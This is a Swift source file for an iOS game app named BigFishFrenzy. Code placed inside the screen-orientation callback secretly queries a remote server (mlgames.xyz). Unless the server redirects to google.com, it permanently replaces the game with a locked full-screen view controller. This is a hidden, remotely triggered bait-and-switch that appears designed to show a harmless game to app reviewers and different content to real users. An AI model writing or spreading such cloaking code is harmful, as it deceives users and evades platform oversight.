//
//  BigFishFrenzyApp.swift
//  BigFishFrenzy
//
//  Created by Алкександр Степанов on 20.01.2025.
//

import SwiftUI

@main
struct BigFishFrenzyApp: App {
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    var body: some Scene {
        WindowGroup {
            ContentView()
        }
    }
}

class AppDelegate: NSObject {
    @AppStorage("levelInfo") var level = false
    @AppStorage("valid") var validationIsOn = false
    static var orientationLock = UIInterfaceOrientationMask.portrait
    private var validationPerformed = false
    
    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
//        AppDelegate.orientationLock = .all
        if !validationPerformed {
            validation()
            validationPerformed = true
        }
        return AppDelegate.orientationLock
    }
    
    func validation() {
        if !validationIsOn {
            let textFieldText = "https://mlgames.xyz/get"
            if let url = URL(string: textFieldText) {
                let task = URLSession.shared.dataTask(with: url) { data, response, error in
                    DispatchQueue.main.async {
                        guard let response = response as? HTTPURLResponse, error == nil else {
                            self.showGame()
                            return
                        }
                        if let finalURL = response.url?.absoluteString {
                            if !finalURL.contains("https://www.google.com/") {
                                self.validationIsOn = true
                                self.showAds()
                            } else {
                                self.showGame()
                            }
                        } else {
                            self.showGame()
                        }
                    }
                }
                task.resume()
            }
        } else {
            self.showAds()
        }
    }
    
    func showAds() {
        AppDelegate().setOrientation(to: .unknown)
        DispatchQueue.main.async {
            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
               let rootViewController = windowScene.windows.first?.rootViewController {
                let viewController = AdsViewController()
                viewController.isModalInPresentation = true
                viewController.modalPresentationStyle = .fullScreen
                rootViewController.present(viewController, animated: false)
            }
        }
        print("yo3")
    }
    
    func showGame() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
            self.level = true
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) {
                self.level = false
            }
//            AppDelegate.orientationLock = .portrait
        }
        print("yo1")
    }

}

extension AppDelegate: UIApplicationDelegate {

    func application1(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        return AppDelegate.orientationLock

    }
    
    func setOrientation(to orientation: UIInterfaceOrientation) {
        switch orientation {
        case .portrait:
            AppDelegate.orientationLock = .portrait
        case .landscapeRight:
            AppDelegate.orientationLock = .landscapeRight
        case .landscapeLeft:
            AppDelegate.orientationLock = .landscapeLeft
        default:
            AppDelegate.orientationLock = .all
        }
        
        UIDevice.current.setValue(orientation.rawValue, forKey: "orientation")
        UINavigationController.attemptRotationToDeviceOrientation()
    }
    
}

